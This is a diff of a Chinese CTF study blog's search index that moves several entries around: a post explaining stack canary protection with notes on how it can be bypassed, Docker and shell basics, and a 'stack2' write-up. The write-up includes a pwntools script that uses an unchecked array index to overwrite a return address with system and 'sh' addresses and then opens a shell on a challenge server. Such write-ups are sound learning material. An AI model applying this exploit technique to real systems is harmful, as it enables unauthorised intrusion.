@@ -6,6 +6,43 @@
     <content><![CDATA[]]></content>
   </entry>
   <entry>
+    <title>canary</title>
+    <url>/2019/11/08/canary/</url>
+    <content><![CDATA[<p>资源链接<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/mitigation/canary-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/mitigation/canary-zh/</a></p>
+<p><strong>Canary</strong></p>
+<p>Introduction</p>
+<p>由于 stack overflow 而引发的攻击非常普遍也非常古老, 相应地一种叫做 canary 的 mitigation 技术很早就出现在 glibc 里, 直到现在也作为系统安全的第一道防线存在。</p>
+<p>canary 不管是实现还是设计思想都比较简单高效, 就是插入一个值, 在 stack overflow 发生的 高危区域的尾部, 当函数返回之时检测 canary 的值是否经过了改变, 以此来判断 stack/buffer overflow 是否发生.</p>
+<p>Canary 与 windows 下的 GS 保护都是防止栈溢出的有效手段，它的出现很大程度上防止了栈溢出的出现，并且由于它几乎并不消耗系统资源，所以现在成了 linux 下保护机制的标配</p>
+<p><strong>Canary 原理</strong></p>
+<p>在 GCC 中使用 Canary</p>
+<p>可以在 GCC 中使用以下参数设置 Canary:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-fstack-protector 启用保护，不过只为局部变量中含有数组的函数插入保护</span><br><span class="line">-fstack-protector-all 启用保护，为所有函数插入保护</span><br><span class="line">-fstack-protector-strong</span><br><span class="line">-fstack-protector-explicit 只对有明确stack_protect attribute的函数开启保护</span><br><span class="line">-fno-stack-protector 禁用保护.</span><br></pre></td></tr></table></figure>
+
+<p><strong>Canary 实现原理</strong> </p>
+<p>开启 Canary 保护的 stack 结构大概如下</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">  High</span><br><span class="line">  Address |                 |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | args            |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | return address  |</span><br><span class="line">          +-----------------+</span><br><span class="line">  rbp =&gt;  | old ebp         |</span><br><span class="line">          +-----------------+</span><br><span class="line">rbp-8 =&gt;  | canary value    |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | 局部变量        |</span><br><span class="line">  Low     |                 |</span><br><span class="line">  Address</span><br></pre></td></tr></table></figure>
+
+<p>当程序启用 Canary 编译后，在函数序言部分会取 fs 寄存器 0x28 处的值，存放在栈中 %ebp-0x8 的位置。 这个操作即为向栈中插入 Canary 值，代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov    rax, qword ptr fs:[0x28]</span><br><span class="line">mov    qword ptr [rbp - 8], rax</span><br></pre></td></tr></table></figure>
+
+<p>在函数返回之前，会将该值取出，并与 fs:0x28 的值进行异或。如果异或的结果为 0，说明 canary 未被修改，函数会正常返回，这个操作即为检测是否发生栈溢出。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov    rdx,QWORD PTR [rbp-0x8]</span><br><span class="line">xor    rdx,QWORD PTR fs:0x28</span><br><span class="line">je     0x4005d7 &lt;main+65&gt;</span><br><span class="line">call   0x400460 &lt;__stack_chk_fail@plt&gt;</span><br></pre></td></tr></table></figure>
+
+<p>如果 canary 已经被非法修改，此时程序流程会走到 <strong>stack_chk_fail。</strong>stack_chk_fail 也是位于 glibc 中的函数，默认情况下经过 ELF 的延迟绑定，定义如下。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eglibc-2.19/debug/stack_chk_fail.c</span><br><span class="line"></span><br><span class="line">void __attribute__ ((noreturn)) __stack_chk_fail (void)</span><br><span class="line">&#123;</span><br><span class="line">  __fortify_fail (&quot;stack smashing detected&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg)</span><br><span class="line">&#123;</span><br><span class="line">  /* The loop is added only to keep gcc happy.  */</span><br><span class="line">  while (1)</span><br><span class="line">    __libc_message (2, &quot;*** %s ***: %s terminated\n&quot;,</span><br><span class="line">                    msg, __libc_argv[0] ?: &quot;&lt;unknown&gt;&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这意味可以通过劫持 __stack_chk_fail的 got 值劫持流程或者利用 __stack_chk_fail 泄漏内容 (参见 stack smash)。</p>
+<p>进一步，对于 Linux 来说，fs 寄存器实际指向的是当前栈的 TLS 结构，fs:0x28 指向的正是 stack_guard。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">  void *tcb;        /* Pointer to the TCB.  Not necessarily the</span><br><span class="line">                       thread descriptor used by libpthread.  */</span><br><span class="line">  dtv_t *dtv;</span><br><span class="line">  void *self;       /* Pointer to the thread descriptor.  */</span><br><span class="line">  int multiple_threads;</span><br><span class="line">  uintptr_t sysinfo;</span><br><span class="line">  uintptr_t stack_guard;</span><br><span class="line">  ...</span><br><span class="line">&#125; tcbhead_t;</span><br></pre></td></tr></table></figure>
+
+<p>如果存在溢出可以覆盖位于 TLS 中保存的 Canary 值那么就可以实现绕过保护机制。<br>事实上，TLS 中的值由函数 security_init 进行初始化。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">static void</span><br><span class="line">security_init (void)</span><br><span class="line">&#123;</span><br><span class="line">  // _dl_random的值在进入这个函数的时候就已经由kernel写入.</span><br><span class="line">  // glibc直接使用了_dl_random的值并没有给赋值</span><br><span class="line">  // 如果不采用这种模式, glibc也可以自己产生随机数</span><br><span class="line"></span><br><span class="line">  //将_dl_random的最后一个字节设置为0x0</span><br><span class="line">  uintptr_t stack_chk_guard = _dl_setup_stack_chk_guard (_dl_random);</span><br><span class="line"></span><br><span class="line">  // 设置Canary的值到TLS中</span><br><span class="line">  THREAD_SET_STACK_GUARD (stack_chk_guard);</span><br><span class="line"></span><br><span class="line">  _dl_random = NULL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//THREAD_SET_STACK_GUARD宏用于设置TLS</span><br><span class="line">#define THREAD_SET_STACK_GUARD(value) \</span><br><span class="line">  THREAD_SETMEM (THREAD_SELF, header.stack_guard, value)</span><br></pre></td></tr></table></figure>]]></content>
+      <tags>
+        <tag>保护机制</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>level0</title>
     <url>/2019/08/08/level0/</url>
     <content><![CDATA[<a id="more"></a>
@@ -63,43 +100,6 @@ p.interactive()</code></pre><p>`</p>
 ]]></content>
       <tags>
         <tag>做题题解</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>canary</title>
-    <url>/2019/11/08/canary/</url>
-    <content><![CDATA[<p>资源链接<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/mitigation/canary-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/mitigation/canary-zh/</a></p>
-<p><strong>Canary</strong></p>
-<p>Introduction</p>
-<p>由于 stack overflow 而引发的攻击非常普遍也非常古老, 相应地一种叫做 canary 的 mitigation 技术很早就出现在 glibc 里, 直到现在也作为系统安全的第一道防线存在。</p>
-<p>canary 不管是实现还是设计思想都比较简单高效, 就是插入一个值, 在 stack overflow 发生的 高危区域的尾部, 当函数返回之时检测 canary 的值是否经过了改变, 以此来判断 stack/buffer overflow 是否发生.</p>
-<p>Canary 与 windows 下的 GS 保护都是防止栈溢出的有效手段，它的出现很大程度上防止了栈溢出的出现，并且由于它几乎并不消耗系统资源，所以现在成了 linux 下保护机制的标配</p>
-<p><strong>Canary 原理</strong></p>
-<p>在 GCC 中使用 Canary</p>
-<p>可以在 GCC 中使用以下参数设置 Canary:</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-fstack-protector 启用保护，不过只为局部变量中含有数组的函数插入保护</span><br><span class="line">-fstack-protector-all 启用保护，为所有函数插入保护</span><br><span class="line">-fstack-protector-strong</span><br><span class="line">-fstack-protector-explicit 只对有明确stack_protect attribute的函数开启保护</span><br><span class="line">-fno-stack-protector 禁用保护.</span><br></pre></td></tr></table></figure>
-
-<p><strong>Canary 实现原理</strong> </p>
-<p>开启 Canary 保护的 stack 结构大概如下</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">  High</span><br><span class="line">  Address |                 |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | args            |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | return address  |</span><br><span class="line">          +-----------------+</span><br><span class="line">  rbp =&gt;  | old ebp         |</span><br><span class="line">          +-----------------+</span><br><span class="line">rbp-8 =&gt;  | canary value    |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | 局部变量        |</span><br><span class="line">  Low     |                 |</span><br><span class="line">  Address</span><br></pre></td></tr></table></figure>
-
-<p>当程序启用 Canary 编译后，在函数序言部分会取 fs 寄存器 0x28 处的值，存放在栈中 %ebp-0x8 的位置。 这个操作即为向栈中插入 Canary 值，代码如下：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov    rax, qword ptr fs:[0x28]</span><br><span class="line">mov    qword ptr [rbp - 8], rax</span><br></pre></td></tr></table></figure>
-
-<p>在函数返回之前，会将该值取出，并与 fs:0x28 的值进行异或。如果异或的结果为 0，说明 canary 未被修改，函数会正常返回，这个操作即为检测是否发生栈溢出。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov    rdx,QWORD PTR [rbp-0x8]</span><br><span class="line">xor    rdx,QWORD PTR fs:0x28</span><br><span class="line">je     0x4005d7 &lt;main+65&gt;</span><br><span class="line">call   0x400460 &lt;__stack_chk_fail@plt&gt;</span><br></pre></td></tr></table></figure>
-
-<p>如果 canary 已经被非法修改，此时程序流程会走到 <strong>stack_chk_fail。</strong>stack_chk_fail 也是位于 glibc 中的函数，默认情况下经过 ELF 的延迟绑定，定义如下。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eglibc-2.19/debug/stack_chk_fail.c</span><br><span class="line"></span><br><span class="line">void __attribute__ ((noreturn)) __stack_chk_fail (void)</span><br><span class="line">&#123;</span><br><span class="line">  __fortify_fail (&quot;stack smashing detected&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg)</span><br><span class="line">&#123;</span><br><span class="line">  /* The loop is added only to keep gcc happy.  */</span><br><span class="line">  while (1)</span><br><span class="line">    __libc_message (2, &quot;*** %s ***: %s terminated\n&quot;,</span><br><span class="line">                    msg, __libc_argv[0] ?: &quot;&lt;unknown&gt;&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>这意味可以通过劫持 __stack_chk_fail的 got 值劫持流程或者利用 __stack_chk_fail 泄漏内容 (参见 stack smash)。</p>
-<p>进一步，对于 Linux 来说，fs 寄存器实际指向的是当前栈的 TLS 结构，fs:0x28 指向的正是 stack_guard。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">  void *tcb;        /* Pointer to the TCB.  Not necessarily the</span><br><span class="line">                       thread descriptor used by libpthread.  */</span><br><span class="line">  dtv_t *dtv;</span><br><span class="line">  void *self;       /* Pointer to the thread descriptor.  */</span><br><span class="line">  int multiple_threads;</span><br><span class="line">  uintptr_t sysinfo;</span><br><span class="line">  uintptr_t stack_guard;</span><br><span class="line">  ...</span><br><span class="line">&#125; tcbhead_t;</span><br></pre></td></tr></table></figure>
-
-<p>如果存在溢出可以覆盖位于 TLS 中保存的 Canary 值那么就可以实现绕过保护机制。<br>事实上，TLS 中的值由函数 security_init 进行初始化。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">static void</span><br><span class="line">security_init (void)</span><br><span class="line">&#123;</span><br><span class="line">  // _dl_random的值在进入这个函数的时候就已经由kernel写入.</span><br><span class="line">  // glibc直接使用了_dl_random的值并没有给赋值</span><br><span class="line">  // 如果不采用这种模式, glibc也可以自己产生随机数</span><br><span class="line"></span><br><span class="line">  //将_dl_random的最后一个字节设置为0x0</span><br><span class="line">  uintptr_t stack_chk_guard = _dl_setup_stack_chk_guard (_dl_random);</span><br><span class="line"></span><br><span class="line">  // 设置Canary的值到TLS中</span><br><span class="line">  THREAD_SET_STACK_GUARD (stack_chk_guard);</span><br><span class="line"></span><br><span class="line">  _dl_random = NULL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//THREAD_SET_STACK_GUARD宏用于设置TLS</span><br><span class="line">#define THREAD_SET_STACK_GUARD(value) \</span><br><span class="line">  THREAD_SETMEM (THREAD_SELF, header.stack_guard, value)</span><br></pre></td></tr></table></figure>]]></content>
-      <tags>
-        <tag>保护机制</tag>
       </tags>
   </entry>
   <entry>
@@ -225,88 +225,96 @@ print p.recvall()</code></pre><p> 这题中收获还是不小的，起码读懂�
       </tags>
   </entry>
   <entry>
-    <title></title>
-    <url>/2020/03/04/share/</url>
-    <content><![CDATA[<h2 id="什么是DOCKER"><a href="#什么是DOCKER" class="headerlink" title="什么是DOCKER"></a>什么是DOCKER</h2><p><a href="HTTPS://WWW.CNBLOGS.COM/ECJTUACM-873284962/P/9789130.HTML" target="_blank" rel="noopener">别人的吐血总结</a></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Docker 将应用程序与该程序的依赖，打包在一个文件里面。运行这个文件，就会生成一个虚拟容器。程序在这个虚拟容器里运行，就好像在真实的物理机上运行一样。有了 Docker ，就不用担心环境问题。</span><br></pre></td></tr></table></figure>
+    <title>stack2</title>
+    <url>/2019/10/11/stack2/</url>
+    <content><![CDATA[<p>1.file命令查看为32位</p>
+<p>2.checksec命令查看保护机制<br><img alt data-src="/2019/10/11/stack2/2.png" class="lazyload"></p>
+<p>由保护机制我想到的做本题的方法<br>（1）绕过canary保护<br>（2）rop链控制执行流</p>
+<p>3.做题首先运行一下，查看程序的运行过程</p>
+<p><img alt data-src="/2019/10/11/stack2/1.png" class="lazyload"></p>
+<p>因为做题的关键就在输入输出，本题的输入的作用显而易见，5个选项输入。因此我们可以查看伪c代码并多多观察输入的位置，查看是否有漏洞可以利用。</p>
+<p><img alt data-src="/2019/10/11/stack2/3.png" class="lazyload"></p>
+<p>查看字符串列表发现了熟悉的system函数与、bin/bash<br>可以考虑使用覆盖返回地址，但本题开了保护，不能直接栈溢出，所以接着看伪代码。</p>
+<p><img alt data-src="/2019/10/11/stack2/4.png" class="lazyload"></p>
+<p>在这里可以看到，没有限制v5的值，也就是我们可以通过这个更改距离v13任意位置的值设为v7，即通过两次输入更改值，那我们是否可以直接找到返回地址的位置并且改为system 的地址呢？<br>很明显是可以的。那么偏移是多少呢？</p>
+<p><img alt data-src="/2019/10/11/stack2/5.png" class="lazyload"></p>
+<p>v13距离栈底0x70<br>所以距离是不是就是0x70+0x4呢？<br>大家可以先思考一下。</p>
+<p>这里查询到返回地址和输入的地址。就可以利用差值得出结果0x84<br>但是不知道为什么0x74却不行</p>
+<p>这一题在覆盖返回地址时因为更改的数组的单个字节。是所以要用到多次写入。</p>
+<p>本题需要知道小端模式，现代计算机通常使用的一种内存排列格式</p>
+<p><img alt data-src="/2019/10/11/stack2/6.png" class="lazyload"><br>下面是脚本</p>
+<pre><code>#!/usr/bin/python
+#coding:utf-8
 
-<p>针对简单操作理解一下DOCKER</p>
-<p>拉取一个 DOCKER 镜像，我们可以用如下命令：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker pull image_name</span><br></pre></td></tr></table></figure>
-
-<p>image_name就是指的镜像</p>
-<p>pull就是拉取一个镜像</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Docker镜像	可以看作是一个特殊的文件系统，</span><br><span class="line">除了提供容器运行时所需的程序、库、资源、配置等文件外，还包含了一些为运行时准备的一些配置参数（如匿名卷、环境变量、用户等）。镜像不包含任何动态数据，其内容在构建之后也不会被改变。</span><br></pre></td></tr></table></figure>
-
-<h1 id="如何安装DOCKER"><a href="#如何安装DOCKER" class="headerlink" title="如何安装DOCKER?"></a>如何安装DOCKER?</h1><pre><code>docker rmi image_name        删除镜像
-
-docker run --name container-name -d image-name    运行容器
---name：自定义容器名
--d：表示后台运行
-
-docker ps（查看运行中的容器）；    加上-a；可以查看所有容器
-
-docker stop container-name/container-id    停止当前运行的指定容器
-
-启动    docker start container-name/container-id    启动容器
-
-删除    docker rm container-id    删除指定容器
-
-端口映射    -p 6379:6379
-如:docker run  --name myredis  -d -p 6379:6379 docker.io/redis    
--p:主机端口映射到容器内部的端口
+from pwn import*
 
 
- docker中run和start的区别
-docker run 后面指定的是一个镜像
 
-而docker start指定的是一个容器
 
-docker run是利用镜像生成容器，并启动容器，而docker start是启动一个之前生成过的容器 </code></pre><p>#实例运行、<br>    运行交互式的容器</p>
-<pre><code>sudo docker run -i -t  skysider/pwndocker /bin/bash
--t: 在新容器内指定一个伪终端或终端。
--i: 允许你对容器内的标准输入 (STDIN) 进行交互。</code></pre><p>停止容器<br>    docker stop </p>
-<p>exit 命令或者使用 CTRL+D 来退出容器。</p>
-<p>后台启动容器</p>
-<pre><code>sudo docker run -itd  skysider/pwndocker /bin/bash
- -d 参数时，容器启动后会进入后台
- -i: 允许你对容器内的标准输入 (STDIN) 进行交互。    
- -t: 在新容器内指定一个伪终端或终端。</code></pre><p>docker ps 查看</p>
-<pre><code>在使用 -d 参数时，容器启动后会进入后台。此时想要进入容器，可以通过以下指令进入：
 
-docker attach
 
-docker exec：推荐大家使用 docker exec 命令，因为此退出容器终端，不会导致容器的停止。
+system_addr=0x080485AF
+leave_offset=0x84
 
-例如
-docker attach 4b6771050406
-docker exec -it b26d4f3e2cac /bin/bash
 
-删除容器使用 docker rm 命令：
-docker rm -f 1e560fca3906</code></pre><h2 id="docker-images-查看镜像"><a href="#docker-images-查看镜像" class="headerlink" title="docker images #查看镜像"></a>docker images #查看镜像</h2><pre><code>REPOSITORY：表示镜像的仓库源
-TAG：镜像的标签
-IMAGE ID：镜像ID
-CREATED：镜像创建时间
-SIZE：镜像大小</code></pre><p>我们可以从 Docker Hub 网站来搜索镜像</p>
-<p>面是一段简单的Dockerfile的例子：</p>
-<pre><code>FROM python:2.7
-MAINTAINER Angel_Kitty &lt;angelkitty6698@gmail.com&gt;
-COPY . /app
-WORKDIR /app
-RUN pip install -r requirements.txt
-EXPOSE 5000
-ENTRYPOINT [&quot;python&quot;]
-CMD [&quot;app.py&quot;]
-我们可以分析一下上面这个过程：
+def write_addr(addr,va):
+    io.sendline(&quot;3&quot;)
+    io.recvuntil(&quot;which number to change:\n&quot;)
+    io.sendline(str(addr))
+    io.recvuntil(&quot;new number:\n&quot;)
+    io.sendline(str(va))
+    io.recvuntil(&quot;5. exit\n&quot;)
 
-1、从 Docker Hub 上 pull 下 python 2.7 的基础镜像
-2、显示维护者的信息
-3、copy 当前目录到容器中的 /app 目录下 复制本地主机的 &lt;src&gt; ( Dockerfile 所在目录的相对路径)到容器里 &lt;dest&gt;
-4、指定工作路径为 /app
-5、安装依赖包
-6、暴露 5000 端口
-7、启动 app
-这个例子是启动一个 python flask app 的 Dockerfile ( flask 是 python 的一个轻量的 web 框架)，相信大家从这个例子中能够稍微理解了Dockfile的组成以及指令的编写过程。</code></pre>]]></content>
+io=remote(&apos;111.198.29.45&apos;,&apos;31725&apos;)
+io.recvuntil(&quot;How many numbers you have:\n&quot;)
+io.sendline(&quot;1&quot;)
+io.recvuntil(&quot;Give me your numbers\n&quot;)
+io.sendline(&quot;1&quot;)
+io.recvuntil(&quot;5. exit\n&quot;)
+
+
+# write  system_addr  0x08048450
+
+write_addr(leave_offset,0X50)
+write_addr(leave_offset+1,0X84)
+write_addr(leave_offset+2,0X04)
+write_addr(leave_offset+3,0X08)
+# sh_addr  0x08048987
+leave_offset+=8
+print leave_offset
+write_addr(leave_offset,0x87)
+write_addr(leave_offset+1,0X89)
+write_addr(leave_offset+2,0X04)
+write_addr(leave_offset+3,0X08)
+
+io.sendline(&quot;5&quot;)
+io.interactive()    </code></pre>]]></content>
+      <tags>
+        <tag>做题题解</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>shell</title>
+    <url>/2019/10/09/shell/</url>
+    <content><![CDATA[<p>#shell （计算机壳层）<br>在计算机科学中，Shell俗称壳（用来区别于核），是指“为使用者提供操作界面”的软件（命令解析器）。它类似于DOS下的command.com和后来的cmd.exe。它接收用户命令，然后调用相应的应用程序。</p>
+<p>同时它又是一种程序设计语言。作为命令语言，它交互式解释和执行用户输入的命令或者自动地解释和执行预先设定好的一连串的命令；作为程序设计语言，它定义了各种变量和参数，并提供了许多在高级语言中才具有的控制结构，包括循环和分支。<br>在排序算法中，Shell是希尔排序的名称。</p>
+<p>#基本上shell分两大类：</p>
+<p>###一：图形界面shell（Graphical User Interface shell 即 GUI shell）<br>例如：应用最为广泛的 Windows Explorer （微软的windows系列操作系统），还有也包括广为人知的 Linux shell，其中linux shell 包括 X window manager (BlackBox和FluxBox），以及功能更强大的CDE、GNOME、KDE、 XFCE。</p>
+<p>###二：命令行式shell（Command Line Interface shell ，即CLI shell）<br>例如：<br>bash / sh / ksh / csh（Unix/linux 系统）<br>（MS-DOS系统）<br>cmd.exe/ 命令提示字符（Windows NT 系统）<br>Windows PowerShell（支持 .NET Framework 技术的 Windows NT 系统）</p>
+<pre><code>传统意义上的shell指的是命令行式的shell，以后如果不特别注明，shell是指命令行式的shell。
+
+文字操作系统与外部最主要的接口就叫做shell。
+shell是操作系统最外面的一层。
+shell管理你与操作系统之间的交互：
+等待你输入，向操作系统解释你的输入，
+并且处理各种各样的操作系统的输出结果。</code></pre><p>shell提供了你与操作系统之间通讯的方式。这种通讯可以以交互方式（从键盘输入，并且可以立即得到响应），或者以shell script(非交互）方式执行。shell script是放在文件中的一串shell和操作系统命令，它们可以被重复使用。本质上，shell script是命令行命令简单的组合到一个文件里面。</p>
+<p>Shell基本上是一个命令解释器，类似于DOS下的command。它接收用户命令（如ls等），然后调用相应的应用程序。较为通用的shell有标准的Bourne shell (sh）和C shell (csh）。</p>
+<p>###交互式shell和非交互式shell</p>
+<p>交互式模式就是shell等待你的输入，并且执行你提交的命令。这种模式被称作交互式是因为shell与用户进行交互。这种模式也是大多数用户非常熟悉的：登录、执行一些命令、签退。当你签退后，shell也终止了。<br>shell也可以运行在另外一种模式：非交互式模式。在这种模式下，shell不与你进行交互，而是读取存放在文件中的命令，并且执行它们。当它读到文件的结尾，shell也就终止了。</p>
+]]></content>
+      <tags>
+        <tag>计算机基础概念</tag>
+      </tags>
   </entry>
   <entry>
     <title>python基本数据类型</title>
@@ -413,27 +421,88 @@ for key in info:
       </tags>
   </entry>
   <entry>
-    <title>shell</title>
-    <url>/2019/10/09/shell/</url>
-    <content><![CDATA[<p>#shell （计算机壳层）<br>在计算机科学中，Shell俗称壳（用来区别于核），是指“为使用者提供操作界面”的软件（命令解析器）。它类似于DOS下的command.com和后来的cmd.exe。它接收用户命令，然后调用相应的应用程序。</p>
-<p>同时它又是一种程序设计语言。作为命令语言，它交互式解释和执行用户输入的命令或者自动地解释和执行预先设定好的一连串的命令；作为程序设计语言，它定义了各种变量和参数，并提供了许多在高级语言中才具有的控制结构，包括循环和分支。<br>在排序算法中，Shell是希尔排序的名称。</p>
-<p>#基本上shell分两大类：</p>
-<p>###一：图形界面shell（Graphical User Interface shell 即 GUI shell）<br>例如：应用最为广泛的 Windows Explorer （微软的windows系列操作系统），还有也包括广为人知的 Linux shell，其中linux shell 包括 X window manager (BlackBox和FluxBox），以及功能更强大的CDE、GNOME、KDE、 XFCE。</p>
-<p>###二：命令行式shell（Command Line Interface shell ，即CLI shell）<br>例如：<br>bash / sh / ksh / csh（Unix/linux 系统）<br>（MS-DOS系统）<br>cmd.exe/ 命令提示字符（Windows NT 系统）<br>Windows PowerShell（支持 .NET Framework 技术的 Windows NT 系统）</p>
-<pre><code>传统意义上的shell指的是命令行式的shell，以后如果不特别注明，shell是指命令行式的shell。
+    <title></title>
+    <url>/2020/03/04/share/</url>
+    <content><![CDATA[<h2 id="什么是DOCKER"><a href="#什么是DOCKER" class="headerlink" title="什么是DOCKER"></a>什么是DOCKER</h2><p><a href="HTTPS://WWW.CNBLOGS.COM/ECJTUACM-873284962/P/9789130.HTML" target="_blank" rel="noopener">别人的吐血总结</a></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Docker 将应用程序与该程序的依赖，打包在一个文件里面。运行这个文件，就会生成一个虚拟容器。程序在这个虚拟容器里运行，就好像在真实的物理机上运行一样。有了 Docker ，就不用担心环境问题。</span><br></pre></td></tr></table></figure>
 
-文字操作系统与外部最主要的接口就叫做shell。
-shell是操作系统最外面的一层。
-shell管理你与操作系统之间的交互：
-等待你输入，向操作系统解释你的输入，
-并且处理各种各样的操作系统的输出结果。</code></pre><p>shell提供了你与操作系统之间通讯的方式。这种通讯可以以交互方式（从键盘输入，并且可以立即得到响应），或者以shell script(非交互）方式执行。shell script是放在文件中的一串shell和操作系统命令，它们可以被重复使用。本质上，shell script是命令行命令简单的组合到一个文件里面。</p>
-<p>Shell基本上是一个命令解释器，类似于DOS下的command。它接收用户命令（如ls等），然后调用相应的应用程序。较为通用的shell有标准的Bourne shell (sh）和C shell (csh）。</p>
-<p>###交互式shell和非交互式shell</p>
-<p>交互式模式就是shell等待你的输入，并且执行你提交的命令。这种模式被称作交互式是因为shell与用户进行交互。这种模式也是大多数用户非常熟悉的：登录、执行一些命令、签退。当你签退后，shell也终止了。<br>shell也可以运行在另外一种模式：非交互式模式。在这种模式下，shell不与你进行交互，而是读取存放在文件中的命令，并且执行它们。当它读到文件的结尾，shell也就终止了。</p>
-]]></content>
-      <tags>
-        <tag>计算机基础概念</tag>
-      </tags>
+<p>针对简单操作理解一下DOCKER</p>
+<p>拉取一个 DOCKER 镜像，我们可以用如下命令：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker pull image_name</span><br></pre></td></tr></table></figure>
+
+<p>image_name就是指的镜像</p>
+<p>pull就是拉取一个镜像</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Docker镜像	可以看作是一个特殊的文件系统，</span><br><span class="line">除了提供容器运行时所需的程序、库、资源、配置等文件外，还包含了一些为运行时准备的一些配置参数（如匿名卷、环境变量、用户等）。镜像不包含任何动态数据，其内容在构建之后也不会被改变。</span><br></pre></td></tr></table></figure>
+
+<h1 id="如何安装DOCKER"><a href="#如何安装DOCKER" class="headerlink" title="如何安装DOCKER?"></a>如何安装DOCKER?</h1><pre><code>docker rmi image_name        删除镜像
+
+docker run --name container-name -d image-name    运行容器
+--name：自定义容器名
+-d：表示后台运行
+
+docker ps（查看运行中的容器）；    加上-a；可以查看所有容器
+
+docker stop container-name/container-id    停止当前运行的指定容器
+
+启动    docker start container-name/container-id    启动容器
+
+删除    docker rm container-id    删除指定容器
+
+端口映射    -p 6379:6379
+如:docker run  --name myredis  -d -p 6379:6379 docker.io/redis    
+-p:主机端口映射到容器内部的端口
+
+
+ docker中run和start的区别
+docker run 后面指定的是一个镜像
+
+而docker start指定的是一个容器
+
+docker run是利用镜像生成容器，并启动容器，而docker start是启动一个之前生成过的容器 </code></pre><p>#实例运行、<br>    运行交互式的容器</p>
+<pre><code>sudo docker run -i -t  skysider/pwndocker /bin/bash
+-t: 在新容器内指定一个伪终端或终端。
+-i: 允许你对容器内的标准输入 (STDIN) 进行交互。</code></pre><p>停止容器<br>    docker stop </p>
+<p>exit 命令或者使用 CTRL+D 来退出容器。</p>
+<p>后台启动容器</p>
+<pre><code>sudo docker run -itd  skysider/pwndocker /bin/bash
+ -d 参数时，容器启动后会进入后台
+ -i: 允许你对容器内的标准输入 (STDIN) 进行交互。    
+ -t: 在新容器内指定一个伪终端或终端。</code></pre><p>docker ps 查看</p>
+<pre><code>在使用 -d 参数时，容器启动后会进入后台。此时想要进入容器，可以通过以下指令进入：
+
+docker attach
+
+docker exec：推荐大家使用 docker exec 命令，因为此退出容器终端，不会导致容器的停止。
+
+例如
+docker attach 4b6771050406
+docker exec -it b26d4f3e2cac /bin/bash
+
+删除容器使用 docker rm 命令：
+docker rm -f 1e560fca3906</code></pre><h2 id="docker-images-查看镜像"><a href="#docker-images-查看镜像" class="headerlink" title="docker images #查看镜像"></a>docker images #查看镜像</h2><pre><code>REPOSITORY：表示镜像的仓库源
+TAG：镜像的标签
+IMAGE ID：镜像ID
+CREATED：镜像创建时间
+SIZE：镜像大小</code></pre><p>我们可以从 Docker Hub 网站来搜索镜像</p>
+<p>面是一段简单的Dockerfile的例子：</p>
+<pre><code>FROM python:2.7
+MAINTAINER Angel_Kitty &lt;angelkitty6698@gmail.com&gt;
+COPY . /app
+WORKDIR /app
+RUN pip install -r requirements.txt
+EXPOSE 5000
+ENTRYPOINT [&quot;python&quot;]
+CMD [&quot;app.py&quot;]
+我们可以分析一下上面这个过程：
+
+1、从 Docker Hub 上 pull 下 python 2.7 的基础镜像
+2、显示维护者的信息
+3、copy 当前目录到容器中的 /app 目录下 复制本地主机的 &lt;src&gt; ( Dockerfile 所在目录的相对路径)到容器里 &lt;dest&gt;
+4、指定工作路径为 /app
+5、安装依赖包
+6、暴露 5000 端口
+7、启动 app
+这个例子是启动一个 python flask app 的 Dockerfile ( flask 是 python 的一个轻量的 web 框架)，相信大家从这个例子中能够稍微理解了Dockfile的组成以及指令的编写过程。</code></pre>]]></content>
   </entry>
   <entry>
     <title>test</title>
@@ -444,75 +513,6 @@ shell管理你与操作系统之间的交互：
       </categories>
       <tags>
         <tag>测试</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>stack2</title>
-    <url>/2019/10/11/stack2/</url>
-    <content><![CDATA[<p>1.file命令查看为32位</p>
